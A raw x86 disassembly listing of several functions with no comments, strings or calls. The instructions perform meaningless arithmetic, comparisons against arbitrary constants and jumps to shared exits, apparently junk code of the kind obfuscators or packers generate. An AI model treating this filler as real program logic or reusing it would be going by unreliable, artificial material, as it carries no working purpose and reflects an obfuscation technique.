  453917:	mov    edi,DWORD PTR [ebp-0x24]
  45391a:	xor    DWORD PTR [ebp-0x24],edx
  45391d:	mov    eax,DWORD PTR [ebp-0x24]
  453920:	xor    DWORD PTR [ebp-0x24],esi
  453923:	test   edi,0x8c282225
  453929:	je     0x453953
  45392b:	mov    esi,DWORD PTR [ebp-0x24]
  45392e:	add    edi,ebx
  453930:	sub    esi,ecx
  453932:	mov    ebx,0xb638
  453937:	mov    DWORD PTR [ebp-0x24],edi
  45393a:	add    DWORD PTR [ebp-0x24],esi
  45393d:	cmp    esi,edx
  45393f:	je     0x453953
  453941:	mov    edx,DWORD PTR [ebp-0x24]
  453944:	sub    edx,ebx
  453946:	mov    esi,ecx
  453948:	sub    DWORD PTR [ebp-0x24],eax
  45394b:	add    esi,ebx
  45394d:	add    DWORD PTR [ebp-0x24],esi
  453950:	sub    DWORD PTR [ebp-0x24],edx
  453953:	pop    edi
  453954:	mov    ebx,DWORD PTR [ebp-0x24]
  453957:	mov    ecx,0x9b
  45395c:	add    DWORD PTR [ebp-0x24],ecx
  45395f:	mov    DWORD PTR [ebp-0x24],ebx
  453962:	pop    esi
  453963:	add    edx,esi
  453965:	test   edx,0x2459
  45396b:	jne    0x4539e0
  45396d:	mov    eax,DWORD PTR [ebp-0x24]
  453970:	mov    ebx,DWORD PTR [ebp-0x24]
  453973:	sub    DWORD PTR [ebp-0x24],eax
  453976:	test   eax,0x2d53
  45397b:	je     0x4539e0
  45397d:	mov    ecx,DWORD PTR [ebp-0x24]
  453980:	sub    edx,esi
  453982:	add    DWORD PTR [ebp-0x24],ecx
  453985:	mov    eax,ecx
  453987:	cmp    edi,0xffffffc4
  45398a:	je     0x4539e0
  45398c:	mov    ecx,DWORD PTR [ebp-0x24]
  45398f:	or     edx,eax
  453991:	and    DWORD PTR [ebp-0x24],edi
  453994:	xor    DWORD PTR [ebp-0x24],edx
  453997:	mov    edx,DWORD PTR [ebp-0x24]
  45399a:	add    ebx,edx
  45399c:	cmp    ecx,DWORD PTR [ebp-0x8]
  45399f:	je     0x4539e0
  4539a1:	mov    edx,DWORD PTR ds:0x47192c
  4539a7:	mov    eax,DWORD PTR [ebp-0x24]
  4539aa:	cmp    eax,DWORD PTR ds:0x47192c
  4539b0:	jne    0x4539e0
  4539b2:	sub    ebx,ecx
  4539b4:	mov    ecx,DWORD PTR [ebp-0x24]
  4539b7:	cmp    ecx,0x5e
  4539ba:	jne    0x4539e0
  4539bc:	add    ecx,edx
  4539be:	add    DWORD PTR [ebp-0x24],ecx
  4539c1:	or     eax,edi
  4539c3:	cmp    eax,DWORD PTR ds:0x47192c
  4539c9:	jne    0x4539e0
  4539cb:	mov    edx,0xb1
  4539d0:	mov    ecx,DWORD PTR [ebp-0x24]
  4539d3:	sub    ecx,eax
  4539d5:	and    ebx,edi
  4539d7:	sub    DWORD PTR [ebp-0x24],ebx
  4539da:	add    DWORD PTR [ebp-0x24],edx
  4539dd:	xor    DWORD PTR [ebp-0x24],ecx
  4539e0:	pop    ebx
  4539e1:	cmp    ebx,esi
  4539e3:	jne    0x4539f4
  4539e5:	xor    eax,eax
  4539e7:	xor    ecx,ecx
  4539e9:	sub    DWORD PTR [ebp-0x24],ebx
  4539ec:	add    DWORD PTR [ebp-0x24],ecx
  4539ef:	or     edx,eax
  4539f1:	or     DWORD PTR [ebp-0x24],edx
  4539f4:	leave  
  4539f5:	ret    
  4539f6:	int3   
  4539f7:	int3   
  4539f8:	int3   
  4539f9:	int3   
  4539fa:	int3   
  4539fb:	push   ebp
  4539fc:	mov    ebp,esp
  4539fe:	sub    esp,0x28
  453a01:	mov    ecx,0x19
  453a06:	xor    eax,eax
  453a08:	mov    DWORD PTR [ebp-0x24],ecx
  453a0b:	sub    eax,ecx
  453a0d:	add    eax,ecx
  453a0f:	sub    DWORD PTR [ebp-0x24],eax
  453a12:	push   ebx
  453a13:	mov    edx,DWORD PTR [ebp-0x24]
  453a16:	test   edx,0xc4
  453a1c:	jne    0x453a30
  453a1e:	add    edx,eax
  453a20:	mov    eax,DWORD PTR [ebp-0x24]
  453a23:	sub    edx,ecx
  453a25:	or     DWORD PTR [ebp-0x24],eax
  453a28:	xor    ebx,ebx
  453a2a:	add    DWORD PTR [ebp-0x24],edx
  453a2d:	sub    DWORD PTR [ebp-0x24],ebx
  453a30:	push   esi
  453a31:	add    ecx,eax
  453a33:	mov    ebx,DWORD PTR [ebp-0x24]
  453a36:	mov    eax,DWORD PTR [ebp-0x24]
  453a39:	test   ecx,0xef
  453a3f:	jne    0x453b8d
  453a45:	sub    DWORD PTR [ebp-0x24],edx
  453a48:	mov    esi,DWORD PTR [ebp-0x24]
  453a4b:	cmp    esi,0x9847
  453a51:	je     0x453b8d
  453a57:	sub    esi,ebx
  453a59:	mov    ebx,DWORD PTR [ebp-0x24]
  453a5c:	mov    edx,DWORD PTR [ebp-0x24]
  453a5f:	sub    esi,ebx
  453a61:	cmp    eax,0x2b
  453a64:	jne    0x453b8d
  453a6a:	mov    ebx,eax
  453a6c:	xor    eax,eax
  453a6e:	or     eax,esi
  453a70:	add    DWORD PTR [ebp-0x24],ecx
  453a73:	cmp    edx,0x5e
  453a76:	je     0x453b8d
  453a7c:	mov    esi,DWORD PTR ds:0x47189c
  453a82:	cmp    edx,DWORD PTR ds:0x47189c
  453a88:	je     0x453b8d
  453a8e:	mov    ecx,ebx
  453a90:	mov    ebx,ecx
  453a92:	or     esi,edx
  453a94:	cmp    eax,0xffffffbb
  453a97:	jne    0x453b8d
  453a9d:	mov    ecx,0xb0
  453aa2:	add    DWORD PTR [ebp-0x24],eax
  453aa5:	mov    eax,ebx
  453aa7:	sub    DWORD PTR [ebp-0x24],esi
  453aaa:	cmp    ebx,0x16
  453aad:	jne    0x453b8d
  453ab3:	sub    ecx,ebx
  453ab5:	sub    ecx,ebx
  453ab7:	cmp    edx,ebx
  453ab9:	je     0x453b8d
  453abf:	mov    edx,esi
  453ac1:	mov    ebx,DWORD PTR [ebp-0x24]
  453ac4:	test   ecx,0x87
  453aca:	jne    0x453b8d
  453ad0:	mov    esi,DWORD PTR [ebp-0x24]
  453ad3:	cmp    edx,esi
  453ad5:	jne    0x453b8d
  453adb:	cmp    edx,0x29
  453ade:	jne    0x453b8d
  453ae4:	cmp    edx,0xfffffffc
  453ae7:	jne    0x453b8d
  453aed:	add    DWORD PTR [ebp-0x24],edx
  453af0:	cmp    esi,0x62e1
  453af6:	je     0x453b8d
  453afc:	and    ebx,esi
  453afe:	mov    esi,DWORD PTR [ebp-0x24]
  453b01:	and    DWORD PTR [ebp-0x24],esi
  453b04:	and    DWORD PTR [ebp-0x24],ecx
  453b07:	mov    esi,DWORD PTR [ebp-0x24]
  453b0a:	add    DWORD PTR [ebp-0x24],esi
  453b0d:	sub    DWORD PTR [ebp-0x24],eax
  453b10:	test   esi,0xbe
  453b16:	jne    0x453b8d
  453b18:	cmp    ebx,0xe610
  453b1e:	je     0x453b8d
  453b20:	mov    ecx,DWORD PTR ds:0x47189c
  453b26:	mov    eax,DWORD PTR [ebp-0x24]
  453b29:	cmp    ebx,DWORD PTR [ebp-0x28]
  453b2c:	jne    0x453b8d
  453b2e:	mov    esi,0x16
  453b33:	sub    esi,ecx
  453b35:	or     esi,ebx
  453b37:	mov    ebx,DWORD PTR [ebp-0x24]
  453b3a:	cmp    ebx,edx
  453b3c:	jne    0x453b8d
  453b3e:	sub    eax,edx
  453b40:	add    esi,edx
  453b42:	xor    edx,edx
  453b44:	mov    ecx,DWORD PTR [ebp-0x24]
  453b47:	or     ecx,eax
  453b49:	and    esi,ebx
  453b4b:	sub    edx,eax
  453b4d:	cmp    ecx,edx
  453b4f:	jne    0x453b8d
  453b51:	cmp    ecx,0x500c0021
  453b57:	je     0x453b8d
  453b59:	xor    ebx,ebx
  453b5b:	cmp    edx,0xb
  453b5e:	je     0x453b8d
  453b60:	mov    eax,edx
  453b62:	sub    DWORD PTR [ebp-0x24],esi
  453b65:	add    eax,ebx
  453b67:	mov    edx,DWORD PTR ds:0x47189c
  453b6d:	sub    ecx,eax
  453b6f:	xor    DWORD PTR [ebp-0x24],ecx
  453b72:	sub    DWORD PTR [ebp-0x24],ecx
  453b75:	mov    DWORD PTR [ebp-0x24],ebx
  453b78:	add    edx,ebx
  453b7a:	add    ebx,eax
  453b7c:	add    DWORD PTR [ebp-0x24],ecx
  453b7f:	add    edx,eax
  453b81:	cmp    eax,edx
  453b83:	je     0x453b8d
  453b85:	add    DWORD PTR [ebp-0x24],edx
  453b88:	sub    ebx,esi
  453b8a:	add    DWORD PTR [ebp-0x24],ebx
  453b8d:	push   edi
  453b8e:	sub    eax,esi
  453b90:	mov    ecx,DWORD PTR [ebp-0x24]
  453b93:	add    ecx,ebx
  453b95:	mov    esi,DWORD PTR [ebp-0x24]
  453b98:	cmp    edx,0xffffffc9
  453b9b:	jne    0x453bf8
  453b9d:	cmp    esi,ecx
  453b9f:	jne    0x453bf8
  453ba1:	mov    edx,0xac29
  453ba6:	mov    ebx,DWORD PTR [ebp-0x24]
  453ba9:	sub    DWORD PTR [ebp-0x24],ebx
  453bac:	sub    esi,eax
  453bae:	add    DWORD PTR [ebp-0x24],esi
  453bb1:	sub    edx,esi
  453bb3:	cmp    ecx,0xccbaa18
  453bb9:	je     0x453bf8
  453bbb:	mov    esi,0xd5
  453bc0:	add    DWORD PTR [ebp-0x24],esi
  453bc3:	mov    esi,edx
  453bc5:	cmp    esi,0x2167
  453bcb:	je     0x453bf8
  453bcd:	add    DWORD PTR [ebp-0x24],ebx
  453bd0:	cmp    esi,0xffffffc5
  453bd3:	je     0x453bf8
  453bd5:	add    ecx,edx
  453bd7:	add    ecx,esi
  453bd9:	cmp    ecx,ebx
  453bdb:	je     0x453bf8
  453bdd:	add    DWORD PTR [ebp-0x24],ebx
  453be0:	cmp    ecx,DWORD PTR ds:0x47189c
  453be6:	jne    0x453bf8
  453be8:	xor    edx,edx
  453bea:	mov    ebx,0x4115822
  453bef:	mov    DWORD PTR [ebp-0x24],ebx
  453bf2:	add    DWORD PTR [ebp-0x24],edx
  453bf5:	add    DWORD PTR [ebp-0x24],ecx
  453bf8:	cmp    esi,DWORD PTR [ebp-0x10]
  453bfb:	je     0x453c05
  453bfd:	mov    esi,DWORD PTR [ebp-0x24]
  453c00:	and    esi,ebx
  453c02:	and    DWORD PTR [ebp-0x24],esi
  453c05:	mov    ebx,0x23
  453c0a:	mov    ecx,DWORD PTR [ebp-0x24]
  453c0d:	sub    DWORD PTR [ebp-0x24],ecx
  453c10:	cmp    eax,DWORD PTR ds:0x47189c
  453c16:	je     0x453d43
  453c1c:	or     eax,ecx
  453c1e:	cmp    eax,DWORD PTR [ebp-0x4]
  453c21:	je     0x453d43
  453c27:	cmp    eax,0x1d
  453c2a:	je     0x453d43
  453c30:	or     eax,ebx
  453c32:	sub    eax,edx
  453c34:	mov    ebx,DWORD PTR [ebp-0x24]
  453c37:	cmp    ecx,DWORD PTR ds:0x47189c
  453c3d:	je     0x453d43
  453c43:	cmp    ebx,0x604d
  453c49:	je     0x453d43
  453c4f:	add    DWORD PTR [ebp-0x24],ebx
  453c52:	add    eax,eax
  453c54:	mov    edi,0x4a05808
  453c59:	mov    esi,ecx
  453c5b:	cmp    ebx,0x7be6
  453c61:	jne    0x453d43
  453c67:	mov    edx,DWORD PTR [ebp-0x24]
  453c6a:	mov    ecx,0x2d
  453c6f:	and    edi,eax
  453c71:	cmp    ebx,DWORD PTR [ebp-0x18]
  453c74:	je     0x453d43
  453c7a:	cmp    edx,eax
  453c7c:	je     0x453d43
  453c82:	mov    eax,ecx
  453c84:	mov    ecx,DWORD PTR [ebp-0x24]
  453c87:	and    DWORD PTR [ebp-0x24],ecx
  453c8a:	test   edi,0xa5
  453c90:	je     0x453d43
  453c96:	cmp    esi,DWORD PTR [ebp-0x1c]
  453c99:	je     0x453d43
  453c9f:	cmp    esi,0x76
  453ca2:	jne    0x453d43
  453ca8:	cmp    ecx,0x20201040
  453cae:	je     0x453d43
  453cb4:	mov    ecx,DWORD PTR [ebp-0x24]
  453cb7:	cmp    ebx,DWORD PTR [ebp-0x18]
  453cba:	je     0x453d43
  453cc0:	sub    DWORD PTR [ebp-0x24],edx
  453cc3:	xor    ebx,ebx
  453cc5:	sub    ecx,edi
  453cc7:	xor    edx,edx
  453cc9:	cmp    ecx,0xc
  453ccc:	je     0x453d43
  453cce:	mov    DWORD PTR [ebp-0xc],edx
  453cd1:	cmp    ecx,0xfffffff4
  453cd4:	je     0x453d43
  453cd6:	mov    edi,DWORD PTR [ebp-0xc]
  453cd9:	mov    edx,0x30
  453cde:	or     DWORD PTR [ebp-0x24],eax
  453ce1:	sub    DWORD PTR [ebp-0xc],ecx
  453ce4:	add    esi,ecx
  453ce6:	test   edi,0xfb
  453cec:	jne    0x453d43
  453cee:	mov    eax,0xdd
  453cf3:	sub    eax,edx
  453cf5:	mov    ecx,DWORD PTR [ebp-0x24]
  453cf8:	test   edi,0xac
  453cfe:	je     0x453d43
  453d00:	test   esi,0x936c
  453d06:	je     0x453d43
  453d08:	xor    DWORD PTR [ebp-0x24],edi
  453d0b:	mov    edx,edi
  453d0d:	xor    edi,edi
  453d0f:	add    ecx,edx
  453d11:	add    eax,ebx
  453d13:	sub    DWORD PTR [ebp-0x24],esi
  453d16:	add    ecx,ecx
  453d18:	sub    eax,edx
  453d1a:	test   edx,0xc0
  453d20:	jne    0x453d43
  453d22:	mov    esi,DWORD PTR [ebp-0x24]
  453d25:	mov    ebx,0x10140468
  453d2a:	sub    DWORD PTR [ebp-0xc],eax
  453d2d:	add    DWORD PTR [ebp-0xc],ebx
  453d30:	sub    DWORD PTR [ebp-0xc],ecx
  453d33:	sub    DWORD PTR [ebp-0xc],edi
  453d36:	add    esi,edx
  453d38:	cmp    esi,DWORD PTR ds:0x47189c
  453d3e:	jne    0x453d43
  453d40:	add    DWORD PTR [ebp-0x24],esi
  453d43:	mov    ebx,DWORD PTR ds:0x47189c
  453d49:	and    ebx,edx
  453d4b:	mov    eax,DWORD PTR [ebp-0x24]
  453d4e:	cmp    ebx,0x5b
  453d51:	je     0x453dfc
  453d57:	xor    edi,edi
  453d59:	mov    edx,0xe
  453d5e:	add    eax,edx
  453d60:	or     DWORD PTR [ebp-0x24],ebx
  453d63:	cmp    eax,DWORD PTR ds:0x47189c
  453d69:	je     0x453dfc
  453d6f:	mov    ecx,DWORD PTR [ebp-0x24]
  453d72:	mov    edx,DWORD PTR [ebp-0x24]
  453d75:	sub    ecx,esi
  453d77:	mov    DWORD PTR [ebp-0x24],esi
  453d7a:	cmp    edx,0x85c2
  453d80:	je     0x453dfc
  453d82:	cmp    edx,0xffffff82
  453d85:	je     0x453dfc
  453d87:	mov    DWORD PTR [ebp-0x24],edx
  453d8a:	cmp    edx,0x40
  453d8d:	je     0x453dfc
  453d8f:	mov    esi,0x40182cec
  453d94:	sub    DWORD PTR [ebp-0x24],eax
  453d97:	mov    edx,DWORD PTR [ebp-0x24]
  453d9a:	cmp    ecx,edx
  453d9c:	je     0x453dfc
  453d9e:	and    ecx,esi
  453da0:	xor    ebx,ebx
  453da2:	mov    esi,DWORD PTR [ebp-0x24]
  453da5:	sub    DWORD PTR [ebp-0x24],esi
  453da8:	and    ecx,edi
  453daa:	add    ecx,eax
  453dac:	add    edx,esi
  453dae:	add    DWORD PTR [ebp-0x24],ecx
  453db1:	cmp    edx,0xde6a
  453db7:	jne    0x453dfc
  453db9:	cmp    edx,0x4a19
  453dbf:	je     0x453dfc
  453dc1:	cmp    edx,edi
  453dc3:	je     0x453dfc
  453dc5:	xor    edi,edi
  453dc7:	sub    edx,eax
  453dc9:	mov    eax,DWORD PTR [ebp-0x24]
  453dcc:	add    eax,esi
  453dce:	cmp    eax,0xffffffbc
  453dd1:	je     0x453dfc
  453dd3:	sub    eax,edi
  453dd5:	mov    esi,edi
  453dd7:	sub    esi,ebx
  453dd9:	mov    ebx,DWORD PTR [ebp-0x24]
  453ddc:	cmp    ecx,DWORD PTR [ebp-0x18]
  453ddf:	jne    0x453dfc
  453de1:	mov    ecx,0xd913
  453de6:	sub    ecx,edx
  453de8:	mov    edx,DWORD PTR ds:0x47189c
  453dee:	add    esi,ecx
  453df0:	mov    DWORD PTR [ebp-0x24],eax
  453df3:	sub    esi,ebx
  453df5:	sub    edx,eax
  453df7:	add    esi,edx
  453df9:	sub    DWORD PTR [ebp-0x24],esi
  453dfc:	mov    eax,DWORD PTR [ebp-0x24]
  453dff:	mov    ebx,DWORD PTR [ebp-0x24]
  453e02:	cmp    ebx,DWORD PTR [ebp-0x28]
  453e05:	je     0x453eef
  453e0b:	sub    eax,edi
  453e0d:	cmp    ecx,0x55
  453e10:	jne    0x453eef
  453e16:	mov    edi,DWORD PTR [ebp-0x24]
  453e19:	test   edi,0x9d
  453e1f:	jne    0x453eef
  453e25:	sub    DWORD PTR [ebp-0x24],eax
  453e28:	mov    edx,DWORD PTR [ebp-0x24]
  453e2b:	cmp    ebx,0x25d
  453e31:	jne    0x453eef
  453e37:	mov    esi,0x7
  453e3c:	mov    ecx,DWORD PTR [ebp-0x24]
  453e3f:	sub    DWORD PTR [ebp-0x24],esi
  453e42:	add    edx,edi
  453e44:	add    edx,esi
  453e46:	add    ebx,esi
  453e48:	cmp    ecx,DWORD PTR [ebp-0xc]
  453e4b:	jne    0x453eef
  453e51:	mov    eax,0x19
  453e56:	add    eax,ebx
  453e58:	add    edx,esi
  453e5a:	mov    esi,DWORD PTR [ebp-0x24]
  453e5d:	add    ecx,edi
  453e5f:	add    ecx,esi
  453e61:	sub    eax,edx
  453e63:	test   eax,0xe5
  453e68:	jne    0x453eef
  453e6e:	add    ecx,esi
  453e70:	cmp    ecx,DWORD PTR [ebp-0xc]
  453e73:	jne    0x453eef
  453e75:	mov    esi,ecx
  453e77:	mov    ecx,0x5c
  453e7c:	test   eax,0x48
  453e81:	je     0x453eef
  453e83:	mov    edx,DWORD PTR [ebp-0x24]
  453e86:	mov    edi,0x76
  453e8b:	test   esi,0x4c1c
  453e91:	jne    0x453eef
  453e93:	sub    edi,eax
  453e95:	cmp    edx,0x7e
  453e98:	jne    0x453eef
  453e9a:	mov    ebx,eax
  453e9c:	test   ebx,0xf0
  453ea2:	jne    0x453eef
  453ea4:	mov    eax,DWORD PTR ds:0x471898
  453eaa:	or     edx,edi
  453eac:	cmp    esi,0x5f
  453eaf:	je     0x453eef
  453eb1:	mov    DWORD PTR [ebp-0x24],esi
  453eb4:	sub    eax,edi
  453eb6:	cmp    edx,edi
  453eb8:	jne    0x453eef
  453eba:	add    edx,ecx
  453ebc:	sub    eax,ebx
  453ebe:	mov    esi,0x1
  453ec3:	mov    ebx,DWORD PTR [ebp-0x24]
  453ec6:	or     ebx,edi
  453ec8:	or     DWORD PTR [ebp-0x24],edx
  453ecb:	sub    ebx,edi
  453ecd:	add    esi,ebx
  453ecf:	test   eax,0xe3
  453ed4:	je     0x453eef
  453ed6:	mov    edx,DWORD PTR [ebp-0x24]
  453ed9:	mov    ecx,DWORD PTR ds:0x4718e0
  453edf:	sub    DWORD PTR [ebp-0x24],ecx
  453ee2:	add    esi,edi
  453ee4:	and    DWORD PTR [ebp-0x24],edx
  453ee7:	sub    esi,ebx
  453ee9:	and    DWORD PTR [ebp-0x24],eax
  453eec:	sub    DWORD PTR [ebp-0x24],esi
  453eef:	pop    edi
  453ef0:	xor    DWORD PTR [ebp-0x24],edi
  453ef3:	pop    esi
  453ef4:	sub    DWORD PTR [ebp-0x24],esi
  453ef7:	pop    ebx
  453ef8:	mov    ecx,0x15
  453efd:	and    ecx,eax
  453eff:	mov    edx,0x54
  453f04:	test   ecx,0x6045
  453f0a:	je     0x453f7b
  453f0c:	add    DWORD PTR [ebp-0x24],ebx
  453f0f:	cmp    ecx,0x283a0655
  453f15:	je     0x453f7b
  453f17:	mov    eax,edx
  453f19:	and    DWORD PTR [ebp-0x24],ecx
  453f1c:	mov    ecx,DWORD PTR ds:0x471898
  453f22:	and    eax,edi
  453f24:	test   esi,0x28
  453f2a:	je     0x453f7b
  453f2c:	xor    ecx,ecx
  453f2e:	mov    edx,DWORD PTR ds:0x471898
  453f34:	add    eax,edx
  453f36:	cmp    eax,DWORD PTR ds:0x471898
  453f3c:	jne    0x453f7b
  453f3e:	sub    eax,ecx
  453f40:	mov    ecx,DWORD PTR [ebp-0x24]
  453f43:	cmp    eax,0xffffffb9
  453f46:	jne    0x453f7b
  453f48:	mov    edx,0x6a
  453f4d:	test   esi,0x1e
  453f53:	jne    0x453f7b
  453f55:	cmp    ebx,0xffffff84
  453f58:	jne    0x453f7b
  453f5a:	cmp    ecx,DWORD PTR ds:0x47189c
  453f60:	jne    0x453f7b
  453f62:	mov    edx,0x9427
  453f67:	sub    DWORD PTR [ebp-0x24],ecx
  453f6a:	and    edx,edi
  453f6c:	sub    DWORD PTR [ebp-0x24],eax
  453f6f:	add    edx,edi
  453f71:	test   eax,0xe870
  453f76:	jne    0x453f7b
  453f78:	sub    DWORD PTR [ebp-0x24],edx
  453f7b:	leave  
  453f7c:	ret    
  453f7d:	int3   
  453f7e:	int3   
  453f7f:	int3   
  453f80:	int3   
  453f81:	int3   
  453f82:	push   ebp
  453f83:	mov    ebp,esp
  453f85:	sub    esp,0x24
  453f88:	mov    edx,DWORD PTR ds:0x471910
  453f8e:	mov    DWORD PTR [ebp-0x4],edx
  453f91:	push   ebx
  453f92:	mov    ecx,DWORD PTR [ebp-0x4]
  453f95:	mov    eax,0x7ed2
  453f9a:	xor    DWORD PTR [ebp-0x4],ecx
  453f9d:	add    DWORD PTR [ebp-0x4],ecx
  453fa0:	cmp    ecx,0x7a
  453fa3:	je     0x453fa8
  453fa5:	sub    DWORD PTR [ebp-0x4],eax
  453fa8:	push   esi
  453fa9:	add    ecx,ecx
  453fab:	mov    ebx,DWORD PTR [ebp-0x4]
  453fae:	or     DWORD PTR [ebp-0x4],ecx
  453fb1:	add    ebx,eax
  453fb3:	add    ebx,ecx
  453fb5:	cmp    ecx,DWORD PTR [ebp-0x4]
  453fb8:	jne    0x453fbd
  453fba:	sub    DWORD PTR [ebp-0x4],ebx
  453fbd:	push   edi
  453fbe:	sub    eax,ecx
  453fc0:	mov    edi,0x5e
  453fc5:	test   eax,0x6
  453fca:	je     0x4541d9
  453fd0:	add    edi,edx
  453fd2:	sub    eax,ecx
  453fd4:	mov    edx,DWORD PTR [ebp-0x4]
  453fd7:	mov    ecx,DWORD PTR [ebp-0x4]
  453fda:	sub    edx,eax
  453fdc:	add    edi,ebx
  453fde:	cmp    edi,0x6e
  453fe1:	jne    0x4541d9
  453fe7:	mov    ebx,DWORD PTR [ebp-0x4]
  453fea:	add    DWORD PTR [ebp-0x4],ecx
  453fed:	and    DWORD PTR [ebp-0x4],edx
  453ff0:	mov    DWORD PTR [ebp-0x4],edi
  453ff3:	mov    esi,DWORD PTR [ebp-0x4]
  453ff6:	add    DWORD PTR [ebp-0x4],ebx
  453ff9:	or     esi,ecx
  453ffb:	cmp    esi,eax
  453ffd:	je     0x4541d9
  454003:	mov    eax,DWORD PTR ds:0x4718bc
  454009:	mov    edi,DWORD PTR [ebp-0x4]
  45400c:	sub    DWORD PTR [ebp-0x4],edi
  45400f:	test   ecx,0x35ee
  454015:	jne    0x4541d9
  45401b:	cmp    esi,DWORD PTR [ebp-0x18]
  45401e:	jne    0x4541d9
  454024:	mov    edx,DWORD PTR [ebp-0x4]
  454027:	mov    eax,DWORD PTR [ebp-0x4]
  45402a:	xor    DWORD PTR [ebp-0x4],eax
  45402d:	cmp    esi,0x8dab
  454033:	je     0x4541d9
  454039:	xor    edi,edi
  45403b:	cmp    esi,ebx
  45403d:	jne    0x4541d9
  454043:	sub    esi,ebx
  454045:	sub    DWORD PTR [ebp-0x4],eax
  454048:	sub    edi,esi
  45404a:	sub    DWORD PTR [ebp-0x4],edx
  45404d:	cmp    esi,0xffffff87
  454050:	jne    0x4541d9
  454056:	cmp    edi,eax
  454058:	je     0x4541d9
  45405e:	mov    ebx,0xd8
  454063:	mov    esi,0x1
  454068:	cmp    edi,0xfffffff2
  45406b:	je     0x4541d9
  454071:	cmp    edi,DWORD PTR ds:0x471910
  454077:	jne    0x4541d9
  45407d:	mov    ecx,DWORD PTR [ebp-0x4]
  454080:	mov    edx,0x1f
  454085:	add    ebx,edi
  454087:	sub    edx,esi
  454089:	add    DWORD PTR [ebp-0x4],ebx
  45408c:	add    DWORD PTR [ebp-0x4],edx
  45408f:	cmp    ecx,DWORD PTR [ebp-0x1c]
  454092:	je     0x4541d9
  454098:	cmp    ecx,DWORD PTR ds:0x471910
  45409e:	je     0x4541d9
  4540a4:	mov    esi,0x21e2
  4540a9:	mov    edi,0xc2
  4540ae:	add    DWORD PTR [ebp-0x4],esi
  4540b1:	sub    ecx,eax
  4540b3:	cmp    ecx,DWORD PTR [ebp-0x1c]
  4540b6:	jne    0x4541d9
  4540bc:	mov    edx,DWORD PTR [ebp-0x4]
  4540bf:	cmp    edx,edi
  4540c1:	je     0x4541d9
  4540c7:	sub    ecx,eax
  4540c9:	and    ecx,ebx
  4540cb:	mov    eax,DWORD PTR [ebp-0x4]
  4540ce:	test   eax,0xa9
  4540d3:	jne    0x4541d9
  4540d9:	sub    eax,edx
  4540db:	or     eax,edi
  4540dd:	mov    ebx,DWORD PTR [ebp-0x4]
  4540e0:	mov    esi,DWORD PTR [ebp-0x4]
  4540e3:	sub    DWORD PTR [ebp-0x4],esi
  4540e6:	add    ecx,edi
  4540e8:	sub    ebx,eax
  4540ea:	test   ecx,0xec
  4540f0:	jne    0x4541d9
  4540f6:	sub    ecx,esi
  4540f8:	mov    esi,ebx
  4540fa:	add    DWORD PTR [ebp-0x4],ecx
  4540fd:	sub    esi,ebx
  4540ff:	mov    edx,0x1d98
  454104:	sub    edx,eax
  454106:	add    edx,edx
  454108:	sub    DWORD PTR [ebp-0x4],esi
  45410b:	add    edx,ecx
  45410d:	add    edx,edx
  45410f:	cmp    esi,0x64bd
  454115:	je     0x4541d9
  45411b:	add    edx,edx
  45411d:	sub    edx,eax
  45411f:	sub    edx,ecx
  454121:	sub    edx,eax
  454123:	add    edx,esi
  454125:	mov    eax,DWORD PTR [ebp-0x4]
  454128:	mov    edi,DWORD PTR [ebp-0x4]
  45412b:	add    edi,ecx
  45412d:	cmp    eax,DWORD PTR [ebp-0x4]
  454130:	jne    0x4541d9
  454136:	cmp    edi,DWORD PTR [ebp-0x8]
  454139:	jne    0x4541d9
  45413f:	cmp    edx,DWORD PTR ds:0x471910
  454145:	jne    0x4541d9
  45414b:	mov    esi,0x51
  454150:	add    esi,edi
  454152:	mov    edi,0x31
  454157:	and    eax,edx
  454159:	cmp    eax,DWORD PTR [ebp-0x8]
  45415c:	jne    0x4541d9
  45415e:	mov    ebx,0x8
  454163:	sub    esi,ebx
  454165:	add    esi,esi
  454167:	mov    edi,DWORD PTR [ebp-0x4]
  45416a:	mov    DWORD PTR [ebp-0x4],eax
  45416d:	cmp    eax,esi
  45416f:	jne    0x4541d9
  454171:	mov    edx,DWORD PTR [ebp-0x4]
  454174:	cmp    edi,esi
  454176:	je     0x4541d9
  454178:	test   esi,0x7a41
  45417e:	jne    0x4541d9
  454180:	add    DWORD PTR [ebp-0x4],esi
  454183:	sub    edi,eax
  454185:	mov    eax,DWORD PTR ds:0x471910
  45418b:	mov    eax,0x74
  454190:	sub    DWORD PTR [ebp-0x4],edx
  454193:	add    edi,ebx
  454195:	add    eax,ebx
  454197:	add    edi,edi
  454199:	test   edi,0x52
  45419f:	je     0x4541d9
  4541a1:	mov    esi,0x32
  4541a6:	mov    ecx,DWORD PTR ds:0x471910
  4541ac:	add    ecx,esi
  4541ae:	cmp    edi,0xffffffe8
  4541b1:	je     0x4541d9
  4541b3:	sub    DWORD PTR [ebp-0x4],ecx
  4541b6:	cmp    edi,edx
  4541b8:	jne    0x4541d9
  4541ba:	mov    esi,DWORD PTR [ebp-0x4]
  4541bd:	mov    ebx,0x51
  4541c2:	sub    DWORD PTR [ebp-0x4],edx
  4541c5:	or     ebx,ecx
  4541c7:	sub    esi,ecx
  4541c9:	add    DWORD PTR [ebp-0x4],eax
  4541cc:	add    DWORD PTR [ebp-0x4],edi
  4541cf:	add    DWORD PTR [ebp-0x4],ebx
  4541d2:	sub    esi,eax
  4541d4:	add    esi,ecx
  4541d6:	add    DWORD PTR [ebp-0x4],esi
  4541d9:	add    eax,esi
  4541db:	add    DWORD PTR [ebp-0x4],eax
  4541de:	sub    DWORD PTR [ebp-0x4],ecx
  4541e1:	cmp    edi,0x8e61
  4541e7:	jne    0x4541ec
  4541e9:	sub    DWORD PTR [ebp-0x4],edx
  4541ec:	sub    DWORD PTR [ebp-0x4],edi
  4541ef:	or     edi,eax
  4541f1:	mov    ecx,DWORD PTR ds:0x4718bc
  4541f7:	sub    DWORD PTR [ebp-0x4],edi
  4541fa:	and    ecx,esi
  4541fc:	cmp    ecx,0x17
  4541ff:	je     0x454253
  454201:	cmp    ecx,0xffffffba
  454204:	je     0x454253
  454206:	and    ecx,edi
  454208:	mov    edx,DWORD PTR [ebp-0x4]
  45420b:	xor    edi,edi
  45420d:	sub    edi,edx
  45420f:	cmp    edi,0x47
  454212:	je     0x454253
  454214:	mov    edx,DWORD PTR ds:0x471910
  45421a:	test   ecx,0x9f
  454220:	jne    0x454253
  454222:	cmp    edi,esi
  454224:	jne    0x454253
  454226:	mov    ebx,0x135e
  45422b:	add    DWORD PTR [ebp-0x4],edi
  45422e:	add    DWORD PTR [ebp-0x4],ebx
  454231:	and    ecx,eax
  454233:	mov    ebx,DWORD PTR [ebp-0x4]
  454236:	and    ecx,ebx
  454238:	sub    ecx,edi
